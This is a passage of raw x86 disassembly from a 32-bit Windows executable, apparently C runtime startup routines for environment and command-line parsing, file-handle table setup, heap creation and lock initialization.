  424b82:	cmp    esi,ebx
  424b84:	jne    0x424b98
  424b86:	jmp    0x424bb8
  424b88:	cmp    al,0x3d
  424b8a:	je     0x424b8d
  424b8c:	inc    edi
  424b8d:	push   esi
  424b8e:	call   0x425960
  424b93:	pop    ecx
  424b94:	lea    esi,[esi+eax*1+0x1]
  424b98:	mov    al,BYTE PTR [esi]
  424b9a:	cmp    al,bl
  424b9c:	jne    0x424b88
  424b9e:	lea    eax,[edi*4+0x4]
  424ba5:	push   eax
  424ba6:	call   0x426072
  424bab:	mov    edi,eax
  424bad:	cmp    edi,ebx
  424baf:	pop    ecx
  424bb0:	mov    DWORD PTR ds:0x45dae4,edi
  424bb6:	jne    0x424bbd
  424bb8:	or     eax,0xffffffff
  424bbb:	jmp    0x424c15
  424bbd:	mov    esi,DWORD PTR ds:0x45dab4
  424bc3:	push   ebp
  424bc4:	jmp    0x424bf0
  424bc6:	push   esi
  424bc7:	call   0x425960
  424bcc:	mov    ebp,eax
  424bce:	inc    ebp
  424bcf:	cmp    BYTE PTR [esi],0x3d
  424bd2:	pop    ecx
  424bd3:	je     0x424bee
  424bd5:	push   ebp
  424bd6:	call   0x426072
  424bdb:	cmp    eax,ebx
  424bdd:	pop    ecx
  424bde:	mov    DWORD PTR [edi],eax
  424be0:	je     0x424c19
  424be2:	push   esi
  424be3:	push   eax
  424be4:	call   0x425730
  424be9:	pop    ecx
  424bea:	pop    ecx
  424beb:	add    edi,0x4
  424bee:	add    esi,ebp
  424bf0:	cmp    BYTE PTR [esi],bl
  424bf2:	jne    0x424bc6
  424bf4:	push   DWORD PTR ds:0x45dab4
  424bfa:	call   0x425f5a
  424bff:	mov    DWORD PTR ds:0x45dab4,ebx
  424c05:	mov    DWORD PTR [edi],ebx
  424c07:	mov    DWORD PTR ds:0x45e260,0x1
  424c11:	xor    eax,eax
  424c13:	pop    ecx
  424c14:	pop    ebp
  424c15:	pop    edi
  424c16:	pop    esi
  424c17:	pop    ebx
  424c18:	ret    
  424c19:	push   DWORD PTR ds:0x45dae4
  424c1f:	call   0x425f5a
  424c24:	mov    DWORD PTR ds:0x45dae4,ebx
  424c2a:	or     eax,0xffffffff
  424c2d:	jmp    0x424c13
  424c2f:	push   ebp
  424c30:	mov    ebp,esp
  424c32:	push   ecx
  424c33:	push   ebx
  424c34:	mov    ebx,DWORD PTR [ebp+0xc]
  424c37:	xor    edx,edx
  424c39:	cmp    DWORD PTR [ebp+0x8],edx
  424c3c:	push   edi
  424c3d:	mov    DWORD PTR [esi],edx
  424c3f:	mov    edi,ecx
  424c41:	mov    DWORD PTR [ebx],0x1
  424c47:	je     0x424c52
  424c49:	mov    ecx,DWORD PTR [ebp+0x8]
  424c4c:	add    DWORD PTR [ebp+0x8],0x4
  424c50:	mov    DWORD PTR [ecx],edi
  424c52:	cmp    BYTE PTR [eax],0x22
  424c55:	jne    0x424c65
  424c57:	xor    ecx,ecx
  424c59:	test   edx,edx
  424c5b:	sete   cl
  424c5e:	inc    eax
  424c5f:	mov    edx,ecx
  424c61:	mov    cl,0x22
  424c63:	jmp    0x424c92
  424c65:	inc    DWORD PTR [esi]
  424c67:	test   edi,edi
  424c69:	je     0x424c70
  424c6b:	mov    cl,BYTE PTR [eax]
  424c6d:	mov    BYTE PTR [edi],cl
  424c6f:	inc    edi
  424c70:	mov    cl,BYTE PTR [eax]
  424c72:	movzx  ebx,cl
  424c75:	inc    eax
  424c76:	test   BYTE PTR [ebx+0x45df21],0x4
  424c7d:	je     0x424c8b
  424c7f:	inc    DWORD PTR [esi]
  424c81:	test   edi,edi
  424c83:	je     0x424c8a
  424c85:	mov    bl,BYTE PTR [eax]
  424c87:	mov    BYTE PTR [edi],bl
  424c89:	inc    edi
  424c8a:	inc    eax
  424c8b:	test   cl,cl
  424c8d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c90:	je     0x424cc4
  424c92:	test   edx,edx
  424c94:	jne    0x424c52
  424c96:	cmp    cl,0x20
  424c99:	je     0x424ca0
  424c9b:	cmp    cl,0x9
  424c9e:	jne    0x424c52
  424ca0:	test   edi,edi
  424ca2:	je     0x424ca8
  424ca4:	and    BYTE PTR [edi-0x1],0x0
  424ca8:	and    DWORD PTR [ebp-0x4],0x0
  424cac:	cmp    BYTE PTR [eax],0x0
  424caf:	je     0x424d8b
  424cb5:	mov    cl,BYTE PTR [eax]
  424cb7:	cmp    cl,0x20
  424cba:	je     0x424cc1
  424cbc:	cmp    cl,0x9
  424cbf:	jne    0x424cc7
  424cc1:	inc    eax
  424cc2:	jmp    0x424cb5
  424cc4:	dec    eax
  424cc5:	jmp    0x424ca8
  424cc7:	cmp    BYTE PTR [eax],0x0
  424cca:	je     0x424d8b
  424cd0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cd4:	je     0x424cdf
  424cd6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cd9:	add    DWORD PTR [ebp+0x8],0x4
  424cdd:	mov    DWORD PTR [ecx],edi
  424cdf:	inc    DWORD PTR [ebx]
  424ce1:	xor    ebx,ebx
  424ce3:	inc    ebx
  424ce4:	xor    edx,edx
  424ce6:	jmp    0x424cea
  424ce8:	inc    eax
  424ce9:	inc    edx
  424cea:	cmp    BYTE PTR [eax],0x5c
  424ced:	je     0x424ce8
  424cef:	cmp    BYTE PTR [eax],0x22
  424cf2:	jne    0x424d1a
  424cf4:	test   dl,0x1
  424cf7:	jne    0x424d18
  424cf9:	cmp    DWORD PTR [ebp-0x4],0x0
  424cfd:	je     0x424d0b
  424cff:	lea    ecx,[eax+0x1]
  424d02:	cmp    BYTE PTR [ecx],0x22
  424d05:	jne    0x424d0b
  424d07:	mov    eax,ecx
  424d09:	jmp    0x424d0d
  424d0b:	xor    ebx,ebx
  424d0d:	xor    ecx,ecx
  424d0f:	cmp    DWORD PTR [ebp-0x4],ecx
  424d12:	sete   cl
  424d15:	mov    DWORD PTR [ebp-0x4],ecx
  424d18:	shr    edx,1
  424d1a:	test   edx,edx
  424d1c:	je     0x424d2b
  424d1e:	test   edi,edi
  424d20:	je     0x424d26
  424d22:	mov    BYTE PTR [edi],0x5c
  424d25:	inc    edi
  424d26:	inc    DWORD PTR [esi]
  424d28:	dec    edx
  424d29:	jne    0x424d1e
  424d2b:	mov    cl,BYTE PTR [eax]
  424d2d:	test   cl,cl
  424d2f:	je     0x424d79
  424d31:	cmp    DWORD PTR [ebp-0x4],0x0
  424d35:	jne    0x424d41
  424d37:	cmp    cl,0x20
  424d3a:	je     0x424d79
  424d3c:	cmp    cl,0x9
  424d3f:	je     0x424d79
  424d41:	test   ebx,ebx
  424d43:	je     0x424d73
  424d45:	test   edi,edi
  424d47:	je     0x424d62
  424d49:	movzx  edx,cl
  424d4c:	test   BYTE PTR [edx+0x45df21],0x4
  424d53:	je     0x424d5b
  424d55:	mov    BYTE PTR [edi],cl
  424d57:	inc    edi
  424d58:	inc    eax
  424d59:	inc    DWORD PTR [esi]
  424d5b:	mov    cl,BYTE PTR [eax]
  424d5d:	mov    BYTE PTR [edi],cl
  424d5f:	inc    edi
  424d60:	jmp    0x424d71
  424d62:	movzx  ecx,cl
  424d65:	test   BYTE PTR [ecx+0x45df21],0x4
  424d6c:	je     0x424d71
  424d6e:	inc    eax
  424d6f:	inc    DWORD PTR [esi]
  424d71:	inc    DWORD PTR [esi]
  424d73:	inc    eax
  424d74:	jmp    0x424ce1
  424d79:	test   edi,edi
  424d7b:	je     0x424d81
  424d7d:	and    BYTE PTR [edi],0x0
  424d80:	inc    edi
  424d81:	inc    DWORD PTR [esi]
  424d83:	mov    ebx,DWORD PTR [ebp+0xc]
  424d86:	jmp    0x424cac
  424d8b:	mov    eax,DWORD PTR [ebp+0x8]
  424d8e:	test   eax,eax
  424d90:	je     0x424d95
  424d92:	and    DWORD PTR [eax],0x0
  424d95:	inc    DWORD PTR [ebx]
  424d97:	pop    edi
  424d98:	pop    ebx
  424d99:	leave  
  424d9a:	ret    
  424d9b:	push   ebp
  424d9c:	mov    ebp,esp
  424d9e:	push   ecx
  424d9f:	push   ecx
  424da0:	push   ebx
  424da1:	push   esi
  424da2:	push   edi
  424da3:	xor    edi,edi
  424da5:	cmp    DWORD PTR ds:0x45e26c,edi
  424dab:	jne    0x424db2
  424dad:	call   0x425f3c
  424db2:	and    BYTE PTR ds:0x45dc14,0x0
  424db9:	push   0x104
  424dbe:	mov    esi,0x45db10
  424dc3:	push   esi
  424dc4:	push   edi
  424dc5:	call   DWORD PTR ds:0x42906c
  424dcb:	mov    eax,ds:0x45e274
  424dd0:	cmp    eax,edi
  424dd2:	mov    DWORD PTR ds:0x45daf4,esi
  424dd8:	je     0x424de1
  424dda:	cmp    BYTE PTR [eax],0x0
  424ddd:	mov    ebx,eax
  424ddf:	jne    0x424de3
  424de1:	mov    ebx,esi
  424de3:	lea    eax,[ebp-0x4]
  424de6:	push   eax
  424de7:	push   edi
  424de8:	lea    esi,[ebp-0x8]
  424deb:	xor    ecx,ecx
  424ded:	mov    eax,ebx
  424def:	call   0x424c2f
  424df4:	mov    esi,DWORD PTR [ebp-0x4]
  424df7:	mov    eax,DWORD PTR [ebp-0x8]
  424dfa:	shl    esi,0x2
  424dfd:	add    eax,esi
  424dff:	push   eax
  424e00:	call   0x426072
  424e05:	mov    edi,eax
  424e07:	add    esp,0xc
  424e0a:	test   edi,edi
  424e0c:	jne    0x424e13
  424e0e:	or     eax,0xffffffff
  424e11:	jmp    0x424e38
  424e13:	lea    eax,[ebp-0x4]
  424e16:	push   eax
  424e17:	lea    ecx,[esi+edi*1]
  424e1a:	push   edi
  424e1b:	lea    esi,[ebp-0x8]
  424e1e:	mov    eax,ebx
  424e20:	call   0x424c2f
  424e25:	mov    eax,DWORD PTR [ebp-0x4]
  424e28:	dec    eax
  424e29:	pop    ecx
  424e2a:	mov    ds:0x45dad8,eax
  424e2f:	pop    ecx
  424e30:	mov    DWORD PTR ds:0x45dadc,edi
  424e36:	xor    eax,eax
  424e38:	pop    edi
  424e39:	pop    esi
  424e3a:	pop    ebx
  424e3b:	leave  
  424e3c:	ret    
  424e3d:	push   ecx
  424e3e:	push   ecx
  424e3f:	mov    eax,ds:0x45dc18
  424e44:	push   ebx
  424e45:	push   ebp
  424e46:	push   esi
  424e47:	push   edi
  424e48:	mov    edi,DWORD PTR ds:0x429084
  424e4e:	xor    ebx,ebx
  424e50:	xor    esi,esi
  424e52:	cmp    eax,ebx
  424e54:	push   0x2
  424e56:	pop    ebp
  424e57:	jne    0x424e86
  424e59:	call   edi
  424e5b:	mov    esi,eax
  424e5d:	cmp    esi,ebx
  424e5f:	je     0x424e6d
  424e61:	mov    DWORD PTR ds:0x45dc18,0x1
  424e6b:	jmp    0x424e8b
  424e6d:	call   DWORD PTR ds:0x429028
  424e73:	cmp    eax,0x78
  424e76:	jne    0x424e81
  424e78:	mov    eax,ebp
  424e7a:	mov    ds:0x45dc18,eax
  424e7f:	jmp    0x424e86
  424e81:	mov    eax,ds:0x45dc18
  424e86:	cmp    eax,0x1
  424e89:	jne    0x424f08
  424e8b:	cmp    esi,ebx
  424e8d:	jne    0x424e97
  424e8f:	call   edi
  424e91:	mov    esi,eax
  424e93:	cmp    esi,ebx
  424e95:	je     0x424f10
  424e97:	cmp    WORD PTR [esi],bx
  424e9a:	mov    eax,esi
  424e9c:	je     0x424eac
  424e9e:	add    eax,ebp
  424ea0:	cmp    WORD PTR [eax],bx
  424ea3:	jne    0x424e9e
  424ea5:	add    eax,ebp
  424ea7:	cmp    WORD PTR [eax],bx
  424eaa:	jne    0x424e9e
  424eac:	mov    edi,DWORD PTR ds:0x429080
  424eb2:	push   ebx
  424eb3:	push   ebx
  424eb4:	push   ebx
  424eb5:	sub    eax,esi
  424eb7:	push   ebx
  424eb8:	sar    eax,1
  424eba:	inc    eax
  424ebb:	push   eax
  424ebc:	push   esi
  424ebd:	push   ebx
  424ebe:	push   ebx
  424ebf:	mov    DWORD PTR [esp+0x34],eax
  424ec3:	call   edi
  424ec5:	mov    ebp,eax
  424ec7:	cmp    ebp,ebx
  424ec9:	je     0x424efd
  424ecb:	push   ebp
  424ecc:	call   0x426072
  424ed1:	cmp    eax,ebx
  424ed3:	pop    ecx
  424ed4:	mov    DWORD PTR [esp+0x10],eax
  424ed8:	je     0x424efd
  424eda:	push   ebx
  424edb:	push   ebx
  424edc:	push   ebp
  424edd:	push   eax
  424ede:	push   DWORD PTR [esp+0x24]
  424ee2:	push   esi
  424ee3:	push   ebx
  424ee4:	push   ebx
  424ee5:	call   edi
  424ee7:	test   eax,eax
  424ee9:	jne    0x424ef9
  424eeb:	push   DWORD PTR [esp+0x10]
  424eef:	call   0x425f5a
  424ef4:	pop    ecx
  424ef5:	mov    DWORD PTR [esp+0x10],ebx
  424ef9:	mov    ebx,DWORD PTR [esp+0x10]
  424efd:	push   esi
  424efe:	call   DWORD PTR ds:0x42907c
  424f04:	mov    eax,ebx
  424f06:	jmp    0x424f58
  424f08:	cmp    eax,ebp
  424f0a:	je     0x424f14
  424f0c:	cmp    eax,ebx
  424f0e:	je     0x424f14
  424f10:	xor    eax,eax
  424f12:	jmp    0x424f58
  424f14:	call   DWORD PTR ds:0x429078
  424f1a:	mov    esi,eax
  424f1c:	cmp    esi,ebx
  424f1e:	je     0x424f10
  424f20:	cmp    BYTE PTR [esi],bl
  424f22:	je     0x424f2e
  424f24:	inc    eax
  424f25:	cmp    BYTE PTR [eax],bl
  424f27:	jne    0x424f24
  424f29:	inc    eax
  424f2a:	cmp    BYTE PTR [eax],bl
  424f2c:	jne    0x424f24
  424f2e:	sub    eax,esi
  424f30:	inc    eax
  424f31:	mov    ebp,eax
  424f33:	push   ebp
  424f34:	call   0x426072
  424f39:	mov    edi,eax
  424f3b:	cmp    edi,ebx
  424f3d:	pop    ecx
  424f3e:	jne    0x424f44
  424f40:	xor    edi,edi
  424f42:	jmp    0x424f4f
  424f44:	push   ebp
  424f45:	push   esi
  424f46:	push   edi
  424f47:	call   0x426090
  424f4c:	add    esp,0xc
  424f4f:	push   esi
  424f50:	call   DWORD PTR ds:0x429074
  424f56:	mov    eax,edi
  424f58:	pop    edi
  424f59:	pop    esi
  424f5a:	pop    ebp
  424f5b:	pop    ebx
  424f5c:	pop    ecx
  424f5d:	pop    ecx
  424f5e:	ret    
  424f5f:	sub    esp,0x48
  424f62:	push   ebx
  424f63:	mov    ebx,0x480
  424f68:	push   ebx
  424f69:	call   0x426072
  424f6e:	test   eax,eax
  424f70:	pop    ecx
  424f71:	jne    0x424f7b
  424f73:	or     eax,0xffffffff
  424f76:	jmp    0x425158
  424f7b:	mov    ds:0x45e160,eax
  424f80:	mov    DWORD PTR ds:0x45e148,0x20
  424f8a:	lea    ecx,[eax+0x480]
  424f90:	jmp    0x424fb0
  424f92:	and    BYTE PTR [eax+0x4],0x0
  424f96:	or     DWORD PTR [eax],0xffffffff
  424f99:	and    DWORD PTR [eax+0x8],0x0
  424f9d:	mov    BYTE PTR [eax+0x5],0xa
  424fa1:	mov    ecx,DWORD PTR ds:0x45e160
  424fa7:	add    eax,0x24
  424faa:	add    ecx,0x480
  424fb0:	cmp    eax,ecx
  424fb2:	jb     0x424f92
  424fb4:	push   ebp
  424fb5:	push   esi
  424fb6:	push   edi
  424fb7:	lea    eax,[esp+0x14]
  424fbb:	push   eax
  424fbc:	call   DWORD PTR ds:0x429050
  424fc2:	cmp    WORD PTR [esp+0x46],0x0
  424fc8:	je     0x4250b7
  424fce:	mov    eax,DWORD PTR [esp+0x48]
  424fd2:	test   eax,eax
  424fd4:	je     0x4250b7
  424fda:	mov    edi,DWORD PTR [eax]
  424fdc:	lea    ebp,[eax+0x4]
  424fdf:	lea    eax,[edi+ebp*1]
  424fe2:	mov    DWORD PTR [esp+0x10],eax
  424fe6:	mov    eax,0x800
  424feb:	cmp    edi,eax
  424fed:	jl     0x424ff1
  424fef:	mov    edi,eax
  424ff1:	cmp    DWORD PTR ds:0x45e148,edi
  424ff7:	jge    0x425047
  424ff9:	mov    esi,0x45e164
  424ffe:	push   ebx
  424fff:	call   0x426072
  425004:	test   eax,eax
  425006:	pop    ecx
  425007:	je     0x425041
  425009:	add    DWORD PTR ds:0x45e148,0x20
  425010:	mov    DWORD PTR [esi],eax
  425012:	lea    ecx,[eax+0x480]
  425018:	jmp    0x425030
  42501a:	and    BYTE PTR [eax+0x4],0x0
  42501e:	or     DWORD PTR [eax],0xffffffff
  425021:	and    DWORD PTR [eax+0x8],0x0
  425025:	mov    BYTE PTR [eax+0x5],0xa
  425029:	mov    ecx,DWORD PTR [esi]
  42502b:	add    eax,0x24
  42502e:	add    ecx,ebx
  425030:	cmp    eax,ecx
  425032:	jb     0x42501a
  425034:	add    esi,0x4
  425037:	cmp    DWORD PTR ds:0x45e148,edi
  42503d:	jl     0x424ffe
  42503f:	jmp    0x425047
  425041:	mov    edi,DWORD PTR ds:0x45e148
  425047:	xor    ebx,ebx
  425049:	test   edi,edi
  42504b:	jle    0x4250b7
  42504d:	mov    eax,DWORD PTR [esp+0x10]
  425051:	mov    eax,DWORD PTR [eax]
  425053:	cmp    eax,0xffffffff
  425056:	je     0x4250ac
  425058:	mov    cl,BYTE PTR [ebp+0x0]
  42505b:	test   cl,0x1
  42505e:	je     0x4250ac
  425060:	test   cl,0x8
  425063:	jne    0x425070
  425065:	push   eax
  425066:	call   DWORD PTR ds:0x42908c
  42506c:	test   eax,eax
  42506e:	je     0x4250ac
  425070:	mov    ecx,ebx
  425072:	mov    eax,ebx
  425074:	and    eax,0x1f
  425077:	lea    eax,[eax+eax*8]
  42507a:	sar    ecx,0x5
  42507d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425084:	lea    esi,[ecx+eax*4]
  425087:	mov    eax,DWORD PTR [esp+0x10]
  42508b:	mov    eax,DWORD PTR [eax]
  42508d:	mov    DWORD PTR [esi],eax
  42508f:	mov    al,BYTE PTR [ebp+0x0]
  425092:	mov    BYTE PTR [esi+0x4],al
  425095:	lea    eax,[esi+0xc]
  425098:	push   0xfa0
  42509d:	push   eax
  42509e:	call   0x4263dd
  4250a3:	test   eax,eax
  4250a5:	pop    ecx
  4250a6:	pop    ecx
  4250a7:	je     0x4250d7
  4250a9:	inc    DWORD PTR [esi+0x8]
  4250ac:	add    DWORD PTR [esp+0x10],0x4
  4250b1:	inc    ebx
  4250b2:	inc    ebp
  4250b3:	cmp    ebx,edi
  4250b5:	jl     0x42504d
  4250b7:	xor    ebx,ebx
  4250b9:	mov    ecx,DWORD PTR ds:0x45e160
  4250bf:	lea    eax,[ebx+ebx*8]
  4250c2:	lea    esi,[ecx+eax*4]
  4250c5:	cmp    DWORD PTR [esi],0xffffffff
  4250c8:	jne    0x425139
  4250ca:	test   ebx,ebx
  4250cc:	mov    BYTE PTR [esi+0x4],0x81
  4250d0:	jne    0x4250dc
  4250d2:	push   0xfffffff6
  4250d4:	pop    eax
  4250d5:	jmp    0x4250e6
  4250d7:	or     eax,0xffffffff
  4250da:	jmp    0x425155
  4250dc:	mov    eax,ebx
  4250de:	dec    eax
  4250df:	neg    eax
  4250e1:	sbb    eax,eax
  4250e3:	add    eax,0xfffffff5
  4250e6:	push   eax
  4250e7:	call   DWORD PTR ds:0x429068
  4250ed:	mov    edi,eax
  4250ef:	cmp    edi,0xffffffff
  4250f2:	je     0x425133
  4250f4:	push   edi
  4250f5:	call   DWORD PTR ds:0x42908c
  4250fb:	test   eax,eax
  4250fd:	je     0x425133
  4250ff:	and    eax,0xff
  425104:	cmp    eax,0x2
  425107:	mov    DWORD PTR [esi],edi
  425109:	jne    0x425111
  42510b:	or     BYTE PTR [esi+0x4],0x40
  42510f:	jmp    0x42511a
  425111:	cmp    eax,0x3
  425114:	jne    0x42511a
  425116:	or     BYTE PTR [esi+0x4],0x8
  42511a:	lea    eax,[esi+0xc]
  42511d:	push   0xfa0
  425122:	push   eax
  425123:	call   0x4263dd
  425128:	test   eax,eax
  42512a:	pop    ecx
  42512b:	pop    ecx
  42512c:	je     0x4250d7
  42512e:	inc    DWORD PTR [esi+0x8]
  425131:	jmp    0x42513d
  425133:	or     BYTE PTR [esi+0x4],0x40
  425137:	jmp    0x42513d
  425139:	or     BYTE PTR [esi+0x4],0x80
  42513d:	inc    ebx
  42513e:	cmp    ebx,0x3
  425141:	jl     0x4250b9
  425147:	push   DWORD PTR ds:0x45e148
  42514d:	call   DWORD PTR ds:0x429088
  425153:	xor    eax,eax
  425155:	pop    edi
  425156:	pop    esi
  425157:	pop    ebp
  425158:	pop    ebx
  425159:	add    esp,0x48
  42515c:	ret    
  42515d:	push   0xc
  42515f:	push   0x4295b8
  425164:	call   0x425350
  425169:	mov    DWORD PTR [ebp-0x1c],0x42a010
  425170:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  425177:	jae    0x42519b
  425179:	and    DWORD PTR [ebp-0x4],0x0
  42517d:	mov    eax,DWORD PTR [ebp-0x1c]
  425180:	mov    eax,DWORD PTR [eax]
  425182:	test   eax,eax
  425184:	je     0x425191
  425186:	call   eax
  425188:	jmp    0x425191
  42518a:	xor    eax,eax
  42518c:	inc    eax
  42518d:	ret    
  42518e:	mov    esp,DWORD PTR [ebp-0x18]
  425191:	or     DWORD PTR [ebp-0x4],0xffffffff
  425195:	add    DWORD PTR [ebp-0x1c],0x4
  425199:	jmp    0x425170
  42519b:	call   0x42538b
  4251a0:	ret    
  4251a1:	push   0xc
  4251a3:	push   0x4295c8
  4251a8:	call   0x425350
  4251ad:	mov    DWORD PTR [ebp-0x1c],0x42a018
  4251b4:	cmp    DWORD PTR [ebp-0x1c],0x42a018
  4251bb:	jae    0x4251df
  4251bd:	and    DWORD PTR [ebp-0x4],0x0
  4251c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251c4:	mov    eax,DWORD PTR [eax]
  4251c6:	test   eax,eax
  4251c8:	je     0x4251d5
  4251ca:	call   eax
  4251cc:	jmp    0x4251d5
  4251ce:	xor    eax,eax
  4251d0:	inc    eax
  4251d1:	ret    
  4251d2:	mov    esp,DWORD PTR [ebp-0x18]
  4251d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251d9:	add    DWORD PTR [ebp-0x1c],0x4
  4251dd:	jmp    0x4251b4
  4251df:	call   0x42538b
  4251e4:	ret    
  4251e5:	call   0x425426
  4251ea:	mov    eax,ds:0x45d304
  4251ef:	cmp    eax,0xffffffff
  4251f2:	je     0x425202
  4251f4:	push   eax
  4251f5:	call   DWORD PTR ds:0x429094
  4251fb:	or     DWORD PTR ds:0x45d304,0xffffffff
  425202:	ret    
  425203:	push   ebx
  425204:	push   esi
  425205:	call   DWORD PTR ds:0x429028
  42520b:	push   DWORD PTR ds:0x45d304
  425211:	mov    ebx,eax
  425213:	call   DWORD PTR ds:0x4290a4
  425219:	mov    esi,eax
  42521b:	test   esi,esi
  42521d:	jne    0x425268
  42521f:	push   0x88
  425224:	push   0x1
  425226:	call   0x426468
  42522b:	mov    esi,eax
  42522d:	test   esi,esi
  42522f:	pop    ecx
  425230:	pop    ecx
  425231:	je     0x425260
  425233:	push   esi
  425234:	push   DWORD PTR ds:0x45d304
  42523a:	call   DWORD PTR ds:0x4290a0
  425240:	test   eax,eax
  425242:	je     0x425260
  425244:	mov    DWORD PTR [esi+0x54],0x45d258
  42524b:	mov    DWORD PTR [esi+0x14],0x1
  425252:	call   DWORD PTR ds:0x42909c
  425258:	or     DWORD PTR [esi+0x4],0xffffffff
  42525c:	mov    DWORD PTR [esi],eax
  42525e:	jmp    0x425268
  425260:	push   0x10
  425262:	call   0x424416
  425267:	pop    ecx
  425268:	push   ebx
  425269:	call   DWORD PTR ds:0x429098
  42526f:	mov    eax,esi
  425271:	pop    esi
  425272:	pop    ebx
  425273:	ret    
  425274:	call   0x4253dd
  425279:	test   eax,eax
  42527b:	je     0x42528d
  42527d:	call   DWORD PTR ds:0x4290a8
  425283:	cmp    eax,0xffffffff
  425286:	mov    ds:0x45d304,eax
  42528b:	jne    0x425295
  42528d:	call   0x4251e5
  425292:	xor    eax,eax
  425294:	ret    
  425295:	push   esi
  425296:	push   0x88
  42529b:	push   0x1
  42529d:	call   0x426468
  4252a2:	mov    esi,eax
  4252a4:	test   esi,esi
  4252a6:	pop    ecx
  4252a7:	pop    ecx
  4252a8:	je     0x4252da
  4252aa:	push   esi
  4252ab:	push   DWORD PTR ds:0x45d304
  4252b1:	call   DWORD PTR ds:0x4290a0
  4252b7:	test   eax,eax
  4252b9:	je     0x4252da
  4252bb:	mov    DWORD PTR [esi+0x54],0x45d258
  4252c2:	mov    DWORD PTR [esi+0x14],0x1
  4252c9:	call   DWORD PTR ds:0x42909c
  4252cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252d3:	mov    DWORD PTR [esi],eax
  4252d5:	xor    eax,eax
  4252d7:	inc    eax
  4252d8:	pop    esi
  4252d9:	ret    
  4252da:	call   0x4251e5
  4252df:	xor    eax,eax
  4252e1:	pop    esi
  4252e2:	ret    
  4252e3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252ea:	jne    0x4252f9
  4252ec:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252f3:	jb     0x4252f9
  4252f5:	xor    eax,eax
  4252f7:	inc    eax
  4252f8:	ret    
  4252f9:	push   0x3
  4252fb:	pop    eax
  4252fc:	ret    
  4252fd:	xor    eax,eax
  4252ff:	cmp    DWORD PTR [esp+0x4],eax
  425303:	push   0x0
  425305:	sete   al
  425308:	push   0x1000
  42530d:	push   eax
  42530e:	call   DWORD PTR ds:0x429034
  425314:	test   eax,eax
  425316:	mov    ds:0x45e140,eax
  42531b:	je     0x425347
  42531d:	call   0x4252e3
  425322:	cmp    eax,0x3
  425325:	mov    ds:0x45e144,eax
  42532a:	jne    0x42534a
  42532c:	push   0x3f8
  425331:	call   0x4266ea
  425336:	test   eax,eax
  425338:	pop    ecx
  425339:	jne    0x42534a
  42533b:	push   DWORD PTR ds:0x45e140
  425341:	call   DWORD PTR ds:0x4290ac
  425347:	xor    eax,eax
  425349:	ret    
  42534a:	xor    eax,eax
  42534c:	inc    eax
  42534d:	ret    
  42534e:	int3   
  42534f:	int3   
  425350:	push   0x427218
  425355:	mov    eax,fs:0x0
  42535b:	push   eax
  42535c:	mov    eax,DWORD PTR [esp+0x10]
  425360:	mov    DWORD PTR [esp+0x10],ebp
  425364:	lea    ebp,[esp+0x10]
  425368:	sub    esp,eax
  42536a:	push   ebx
  42536b:	push   esi
  42536c:	push   edi
  42536d:	mov    eax,DWORD PTR [ebp-0x8]
  425370:	mov    DWORD PTR [ebp-0x18],esp
  425373:	push   eax
  425374:	mov    eax,DWORD PTR [ebp-0x4]
  425377:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42537e:	mov    DWORD PTR [ebp-0x8],eax
  425381:	lea    eax,[ebp-0x10]
  425384:	mov    fs:0x0,eax
  42538a:	ret    
  42538b:	mov    ecx,DWORD PTR [ebp-0x10]
  42538e:	mov    DWORD PTR fs:0x0,ecx
  425395:	pop    ecx
  425396:	pop    edi
  425397:	pop    esi
  425398:	pop    ebx
  425399:	leave  
  42539a:	push   ecx
  42539b:	ret    
  42539c:	int3   
  42539d:	int3   
  42539e:	int3   
  42539f:	int3   
  4253a0:	cmp    eax,0x1000
  4253a5:	jae    0x4253b5
  4253a7:	neg    eax
  4253a9:	add    eax,esp
  4253ab:	add    eax,0x4
  4253ae:	test   DWORD PTR [eax],eax
  4253b0:	xchg   esp,eax
  4253b1:	mov    eax,DWORD PTR [eax]
  4253b3:	push   eax
  4253b4:	ret    
  4253b5:	push   ecx
  4253b6:	lea    ecx,[esp+0x8]
  4253ba:	sub    ecx,0x1000
  4253c0:	sub    eax,0x1000
  4253c5:	test   DWORD PTR [ecx],eax
  4253c7:	cmp    eax,0x1000
  4253cc:	jae    0x4253ba
  4253ce:	sub    ecx,eax
  4253d0:	mov    eax,esp
  4253d2:	test   DWORD PTR [ecx],eax
  4253d4:	mov    esp,ecx
  4253d6:	mov    ecx,DWORD PTR [eax]
  4253d8:	mov    eax,DWORD PTR [eax+0x4]
  4253db:	push   eax
  4253dc:	ret    
  4253dd:	push   esi
  4253de:	push   edi
  4253df:	xor    esi,esi
  4253e1:	mov    edi,0x45dc20
  4253e6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253ee:	jne    0x42540e
  4253f0:	lea    eax,[esi*8+0x45d310]
  4253f7:	mov    DWORD PTR [eax],edi
  4253f9:	push   0xfa0
  4253fe:	push   DWORD PTR [eax]
  425400:	add    edi,0x18
  425403:	call   0x4263dd
  425408:	test   eax,eax
  42540a:	pop    ecx
  42540b:	pop    ecx
  42540c:	je     0x42541a
  42540e:	inc    esi
  42540f:	cmp    esi,0x24
  425412:	jl     0x4253e6
  425414:	xor    eax,eax
  425416:	inc    eax
  425417:	pop    edi
  425418:	pop    esi
  425419:	ret    
  42541a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425422:	xor    eax,eax
  425424:	jmp    0x425417
  425426:	push   ebx
  425427:	mov    ebx,DWORD PTR ds:0x429090
  42542d:	push   esi
  42542e:	mov    esi,0x45d310
  425433:	push   edi
  425434:	mov    edi,DWORD PTR [esi]
  425436:	test   edi,edi
  425438:	je     0x42544d
  42543a:	cmp    DWORD PTR [esi+0x4],0x1
  42543e:	je     0x42544d
  425440:	push   edi
  425441:	call   ebx
  425443:	push   edi
  425444:	call   0x425f5a
  425449:	and    DWORD PTR [esi],0x0
  42544c:	pop    ecx
  42544d:	add    esi,0x8
  425450:	cmp    esi,0x45d430
  425456:	jl     0x425434
  425458:	mov    esi,0x45d310
  42545d:	pop    edi
  42545e:	mov    eax,DWORD PTR [esi]
  425460:	test   eax,eax
  425462:	je     0x42546d
